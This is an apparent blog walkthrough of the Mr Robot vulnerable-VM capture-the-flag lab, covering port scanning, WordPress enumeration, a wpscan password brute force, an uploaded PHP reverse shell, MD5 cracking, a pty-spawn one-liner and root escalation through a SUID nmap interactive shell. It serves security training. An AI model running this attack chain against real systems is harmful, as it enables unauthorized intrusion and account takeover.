---
layout: post
title: "Owning Mr Robot"
date: 2017-07-01 04:46:24 -0400
comments: true
categories: [penetration testing, writeups]
keywords: mr robot, mr robot vm, mr robot vulnhub, mr robot walkthrough, uniscan, uniscan kali, wpscan, wpscan kail, wpscan tutorial, wpscan brute force, uniscan tool, uniscan kali linux, uniscan tutorial, uniscan gui, mr robot writeup, mr robot ctf, wpscan wordpress, nmap suid, nmap interactive
description: Mr-Robot writeup
---

Today's target was inspired by the Mr Robot series. The goal is to find 3 hidden flags.

<!-- more -->

I used Masscan to grab the open ports, which I then passed to Nmap:

``` 
masscan -p1-65535 --banners 192.168.217.145 --rate=10000

Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-07-01 08:49:44 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 443/tcp on 192.168.217.145                                
Discovered open port 80/tcp on 192.168.217.145     

nmap -T4 -p80,443 -A 192.168.217.145
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```

Just a web server. However, this doesn't look like your regular web app:

{% img center /images/pentest/mr-robot/fsociety.png 'fsociety' 'fsociety login' %}

Interesting, we are in contact with fsociety! I ran each command (type help to see them listed at any time), and here's what we have so far:

* prepare - a video that ends with an address that warrants checking: whoismrrobot.com

* fsociety - a CLI animation that asks if you are ready to join

* inform - a series of news that reveal the hypocrisy of today's (is it really made up?) society

{% img center /images/pentest/mr-robot/deflated.png 'sports scandal' 'sports scandal' %}

{% img center /images/pentest/mr-robot/space.png 'space rocket' 'space rocket' %}

{% img center /images/pentest/mr-robot/meast.png 'middle east' 'middle east' %}

{% img center /images/pentest/mr-robot/gala.png 'gala' 'celebrity gala' %}

* question - more pictures with hard to accept truths

{% img center /images/pentest/mr-robot/america.png 'patriot' 'american dream' %}

{% img center /images/pentest/mr-robot/executive.png 'executive' 'executive stealing' %}

{% img center /images/pentest/mr-robot/capitalist.png 'capitalism' 'capitalism' %}

{% img center /images/pentest/mr-robot/bzns.png 'business' 'business' %}

* wakeup - shows some high level executives arguing in a skyscraper

* join - fsociety requests your mail address to keep in touch

{% img center /images/pentest/mr-robot/mail.png 'enter your mail' 'enter your mail' %}

Alright, we had some fun. Now I checked that URL I mentioned earlier for more breadcrumbs:

{% img center /images/pentest/mr-robot/whois.png 'whois mr robot' 'whois mr robot' %}

You can click on the GUI, look around, play some games. There are also some commands you can run in the terminal:

* fsociety_endgame - launches a game that you might want to discover for yourself

* massacre - launches a movie, but I got a message that content is not available to my location

* elliot - shows a GIF

* fivenine - looks like a collection of clips related to the Five-Nine attack

* restart - another scene from the series

* join - get in touch with Mr Robot

* archive - shows some of the above commands

## Flag #1

When running the commands, you probably noticed that the web path changes to <code>URL/cmdname</code>. I looked for robots.txt, and it looks like Mr Robot isn't the only robot around:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

We've found the first flag: <code>073403c8a58a1f80d943455fb30724b9</code>

The other things looks like a dictionary file with various strings. Maybe it will come in handy later.

Continuing the web recon, I decided to use a tool that I haven't used before: uniscan!

### uniscan description

Homepage: https://sourceforge.net/projects/uniscan/

> Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.

This tool comes in both CLI and GUI form. The GUI interface is plain and simple:

{% img center /images/pentest/mr-robot/uniscan-gui.png 'uniscan-gui' 'uniscan gui' %}

### uniscan options

``` 
####################################
# Uniscan project                  #
# http://uniscan.sourceforge.net/  #
####################################
V. 6.3


OPTIONS:
	-h 	help
	-u 	<url> example: https://www.example.com/
	-f 	<file> list of url's
	-b 	Uniscan go to background
	-q 	Enable Directory checks
	-w 	Enable File checks
	-e 	Enable robots.txt and sitemap.xml check
	-d 	Enable Dynamic checks
	-s 	Enable Static checks
	-r 	Enable Stress checks
	-i 	<dork> Bing search
	-o 	<dork> Google search
	-g 	Web fingerprint
	-j 	Server fingerprint

usage: 
[1] perl ./uniscan.pl -u http://www.example.com/ -qweds
[2] perl ./uniscan.pl -f sites.txt -bqweds
[3] perl ./uniscan.pl -i uniscan
[4] perl ./uniscan.pl -i "ip:xxx.xxx.xxx.xxx"
[5] perl ./uniscan.pl -o "inurl:test"
[6] perl ./uniscan.pl -u https://www.example.com/ -r
```

I ran the CLI tool against the target with most of the flags. While described as simple, it checks for plenty of things: Drupal plugins, mobile versions, error message information, interesting HTML strings, performs whois and nslookup lookups, attempts banner grabbing, runs ping, traceroute and Nmap against the target, looks for some specific issues, and more:

``` 
Crawler Started:
| Plugin name: FCKeditor upload test v.1 Loaded.
| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
| Plugin name: Upload Form Detect v.1.1 Loaded.
| Plugin name: phpinfo() Disclosure v.1 Loaded.
| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
| Plugin name: Code Disclosure v.1.1 Loaded.
| Plugin name: E-mail Detection v.1.1 Loaded.
| Plugin name: External Host Detect v.1.2 Loaded.
| [+] Crawling finished, 59 URL's found!

Dynamic tests:
| Plugin name: Learning New Directories v.1.2 Loaded.
| Plugin name: FCKedior tests v.1.1 Loaded.
| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
| Plugin name: Find Backup Files v.1.2 Loaded.
| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
| Plugin name: Local File Include tests v.1.1 Loaded.
| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
| Plugin name: Remote Command Execution tests v.1.1 Loaded.
| Plugin name: Remote File Include tests v.1.2 Loaded.
| Plugin name: SQL-injection tests v.1.2 Loaded.
| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
| Plugin name: Web Shell Finder v.1.3 Loaded.
```

And the tool did find some useful information for further compromising the target!

``` 
===================================================================================================
|
| Directory check:
| [+] CODE: 200 URL: http://192.168.217.145/Image/
| [+] CODE: 200 URL: http://192.168.217.145/admin/
| [+] CODE: 200 URL: http://192.168.217.145/feed/
| [+] CODE: 200 URL: http://192.168.217.145/image/
| [+] CODE: 200 URL: http://192.168.217.145/login/
| [+] CODE: 200 URL: http://192.168.217.145/rss/
| [+] CODE: 200 URL: http://192.168.217.145/wp-login/
| [+] CODE: 200 URL: http://192.168.217.145/wp-admin/
===================================================================================================
|                                                                                                   
| File check:
| [+] CODE: 200 URL: http://192.168.217.145/admin/index.html
| [+] CODE: 200 URL: http://192.168.217.145/admin/index.php
| [+] CODE: 200 URL: http://192.168.217.145/favicon.ico
| [+] CODE: 200 URL: http://192.168.217.145/index.html
| [+] CODE: 200 URL: http://192.168.217.145/index.html%20
| [+] CODE: 200 URL: http://192.168.217.145/index.php
| [+] CODE: 200 URL: http://192.168.217.145/license.txt
| [+] CODE: 200 URL: http://192.168.217.145/readme.html
| [+] CODE: 200 URL: http://192.168.217.145/readme
| [+] CODE: 200 URL: http://192.168.217.145/robots.txt
| [+] CODE: 200 URL: http://192.168.217.145/search/htx/sqlqhit.asp
| [+] CODE: 200 URL: http://192.168.217.145/search/htx/SQLQHit.asp
| [+] CODE: 200 URL: http://192.168.217.145/search/sqlqhit.asp
| [+] CODE: 200 URL: http://192.168.217.145/search/SQLQHit.asp
| [+] CODE: 200 URL: http://192.168.217.145/sitemap.xml
===================================================================================================
```

What do you know, a Wordpress instance is running on the server! So it's time for wpscan!

### wpscan description

Homepage: https://wpscan.org/

> WPScan is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.

### wpscan options

``` 
wpscan --help
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.2
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

Help :

Some values are settable in a config file, see the example.conf.json

--update                            Update the database to the latest version.
--url       | -u <target url>       The WordPress URL/domain to scan.
--force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
--enumerate | -e [option(s)]        Enumeration.
  option :
    u        usernames from id 1 to 10
    u[10-20] usernames from id 10 to 20 (you must write [] chars)
    p        plugins
    vp       only vulnerable plugins
    ap       all plugins (can take a long time)
    tt       timthumbs
    t        themes
    vt       only vulnerable themes
    at       all themes (can take a long time)
  Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
  If no option is supplied, the default is "vt,tt,u,vp"

--exclude-content-based "<regexp or string>"
                                    Used with the enumeration option, will exclude all occurrences based on the regexp or string supplied.
                                    You do not need to provide the regexp delimiters, but you must write the quotes (simple or double).
--config-file  | -c <config file>   Use the specified config file, see the example.conf.json.
--user-agent   | -a <User-Agent>    Use the specified User-Agent.
--cookie <string>                   String to read cookies from.
--random-agent | -r                 Use a random User-Agent.
--follow-redirection                If the target url has a redirection, it will be followed without asking if you wanted to do so or not
--batch                             Never ask for user input, use the default behaviour.
--no-color                          Do not use colors in the output.
--log                               Creates a log.txt file with WPScan's output.
--no-banner                         Prevents the WPScan banner from being displayed.
--disable-accept-header             Prevents WPScan sending the Accept HTTP header.
--disable-referer                   Prevents setting the Referer header.
--disable-tls-checks                Disables SSL/TLS certificate verification.
--wp-content-dir <wp content dir>   WPScan try to find the content directory (ie wp-content) by scanning the index page, however you can specify it.
                                    Subdirectories are allowed.
--wp-plugins-dir <wp plugins dir>   Same thing than --wp-content-dir but for the plugins directory.
                                    If not supplied, WPScan will use wp-content-dir/plugins. Subdirectories are allowed
--proxy <[protocol://]host:port>    Supply a proxy. HTTP, SOCKS4 SOCKS4A and SOCKS5 are supported.
                                    If no protocol is given (format host:port), HTTP will be used.
--proxy-auth <username:password>    Supply the proxy login credentials.
--basic-auth <username:password>    Set the HTTP Basic authentication.
--wordlist | -w <wordlist>          Supply a wordlist for the password brute forcer.
--username | -U <username>          Only brute force the supplied username.
--usernames     <path-to-file>      Only brute force the usernames from the file.
--cache-dir       <cache-directory> Set the cache directory.
--cache-ttl       <cache-ttl>       Typhoeus cache TTL.
--request-timeout <request-timeout> Request Timeout.
--connect-timeout <connect-timeout> Connect Timeout.
--threads  | -t <number of threads> The number of threads to use when multi-threading requests.
--max-threads     <max-threads>     Maximum Threads.
--throttle        <milliseconds>    Milliseconds to wait before doing another web request. If used, the --threads should be set to 1.
--help     | -h                     This help screen.
--verbose  | -v                     Verbose output.
--version                           Output the current version and exit.


Examples :

-Further help ...
ruby ./wpscan.rb --help

-Do 'non-intrusive' checks ...
ruby ./wpscan.rb --url www.example.com

-Do wordlist password brute force on enumerated users using 50 threads ...
ruby ./wpscan.rb --url www.example.com --wordlist darkc0de.lst --threads 50

-Do wordlist password brute force on the 'admin' username only ...
ruby ./wpscan.rb --url www.example.com --wordlist darkc0de.lst --username admin

-Enumerate installed plugins ...
ruby ./wpscan.rb --url www.example.com --enumerate p

-Enumerate installed themes ...
ruby ./wpscan.rb --url www.example.com --enumerate t

-Enumerate users ...
ruby ./wpscan.rb --url www.example.com --enumerate u

-Enumerate installed timthumbs ...
ruby ./wpscan.rb --url www.example.com --enumerate tt

-Use a HTTP proxy ...
ruby ./wpscan.rb --url www.example.com --proxy 127.0.0.1:8118

-Use a SOCKS5 proxy ... (cURL >= v7.21.7 needed)
ruby ./wpscan.rb --url www.example.com --proxy socks5://127.0.0.1:9000

-Use custom content directory ...
ruby ./wpscan.rb -u www.example.com --wp-content-dir custom-content

-Use custom plugins directory ...
ruby ./wpscan.rb -u www.example.com --wp-plugins-dir wp-content/custom-plugins

-Update the DB ...
ruby ./wpscan.rb --update

-Debug output ...
ruby ./wpscan.rb --url www.example.com --debug-output 2>debug.log

See README for further information.
```

First, I updated the wpscan databse with <code>wpscan --update</code>. Then I performed some enumeration on the target:

``` 
wpscan --url http://192.168.217.145 --enumerate u vp vt --no-banner
[+] URL: http://192.168.217.145/
[+] Started: Sat Jul  1 07:40:05 2017

[+] robots.txt available under: 'http://192.168.217.145/robots.txt'
[!] The WordPress 'http://192.168.217.145/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
[+] XML-RPC Interface available under: http://192.168.217.145/xmlrpc.php

[+] WordPress version 4.3.11 (Released on 2017-05-16) identified from rss generator, rdf generator, atom generator, links opml
[!] 1 vulnerability identified from the version number

[!] Title: WordPress 2.3-4.7.5 - Host Header Injection in Password Reset
    Reference: https://wpvulndb.com/vulnerabilities/8807
    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating usernames ...
[+] We did not enumerate any usernames

[+] Finished: Sat Jul  1 07:40:07 2017
[+] Requests Done: 57
[+] Memory used: 17.109 MB
[+] Elapsed time: 00:00:02
```

I couldn't use wpscan's findings for exploitation. Based on our earlier finding of a dictionary file, the next step seems to involve bruteforcing. I went back to the file and looked at its size:

``` 
wc -l fsocity.dic 
858160 fsocity.dic
```

Not a small one, but maybe it contains duplicates:

``` 
sort fsocity.dic | uniq | wc -l
11451
```

A little over 11k, much more promising! I created a new file without the duplicates: <code>sort fsocity.dic | uniq > fsociety.txt</code>.

The next step was to visit http://192.168.217.145/wp-login.php and try to gather more information. Bogus login attempts triggered the message: ERROR: Invalid username. Next, I looked in the source to see how form parameters look like:

{% img center /images/pentest/mr-robot/wplogin.png 'wplogin' 'wplogin' %}

It seemed I would have to bruteforce for both username and password, but I tried a few character names from the series first, and that's how I found that elliot is a valid user. With this, I used wpscan to perform the bruteforce attack for the password:

``` 
wpscan --url http://192.168.217.145/ --wordlist ~/Downloads/fsociety.txt --username elliot
[...]
[+] Starting the password brute forcer
  [+] [SUCCESS] Login : elliot Password : ER28-0652                                                                                                  

  Brute Forcing 'elliot' Time: 00:02:27 <==================================                                    > (5640 / 11452) 49.24%  ETA: 00:02:32
  +----+--------+------+-----------+
  | Id | Login  | Name | Password  |
  +----+--------+------+-----------+
  |    | elliot |      | ER28-0652 |
  +----+--------+------+-----------+
```

Excellent, wpscan found the password is *ER28-0652*! I logged in and noticed that all the plugins are outdated:

{% img center /images/pentest/mr-robot/plugins.png 'wp plugins' 'wp plugins' %}

I tried uploading a PHP reverse shell as plugin, but got an error that it couldn't install it. I looked in other places where I could upload it, and when browsing the Media tab, I noticed my shell was there :O

{% img center /images/pentest/mr-robot/media.png 'media library' 'media library' %}

Wasn't sure where it placed in, so I just tried adding shell.php to the URL, and Wordpress kindly gave me the correct path to it, which was http://192.168.217.145/wp-content/uploads/2017/07/shell.php

## Flag #2

Finally achieved presence on the machine:

``` 
$ whoami
daemon
$ ls /home
robot
$ ls -la /home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

Found the second flag, but couldn't read it. However, that md5 file was readable:

``` 
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

I cracked the MD5 hash to reveal the password *abcdefghijklmnopqrstuvwxyz* for the user robot. I tried switching to that user, but I got the following error:

``` 
$ su robot
su: must be run from a terminal
```

The error appears because the shell isn't interactive. But I ran into this before, and again [pentestmonkey's oneliners](http://pentestmonkey.net/blog/post-exploitation-without-a-tty) came to the rescue:

``` 
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$ 
```

I grabbed the second flag, and noticed that my commands are now echoed in the terminal and it's annoying:

``` 
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```


## Flag #3

I couldn't find a workaround for that, so I just continued. When I looked for SUID binaries, I found a surprise:

``` 
robot@linux:/$ find / -type f \( -perm +4000 -o -perm +2000 \) -print 2> /dev/null
[...]
/usr/local/bin/nmap
```

After Googling, there even seems to be a [setuid Nmap exploit](https://www.rapid7.com/db/modules/exploit/unix/local/setuid_nmap) in Metasploit! I read more about this problem, and found an interesting [SANS paper](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744) (the Nmap stuff begins on page 11). After some reading, I found that older versions of Nmap had an interactive mode, where you could run shell commands from or drop into a shell (similar to mysql):

``` 
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> 
```

The Nmap version is 3.81, so I tried it out:

``` 
nmap> !whoami
!whoami
root
waiting to reap child : No child processes
```

It did work! Game over, Mr Robot!

``` 
nmap> !sh
!sh
# ls /root
ls /root
firstboot_done	key-3-of-3.txt
# cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

Another interesting challenge, more story driven. It reminded me of [Primer](https://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/).

**Learn more**

- [Using wpscan to find Wordpress vulnerabilities](https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.html)

- [Attack and Defend: Linux Privilege Escalation Techniques of 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)

``` 
 ___________________________________
/ You have literary talent that you \
\ should take pains to develop.     /
 -----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

 


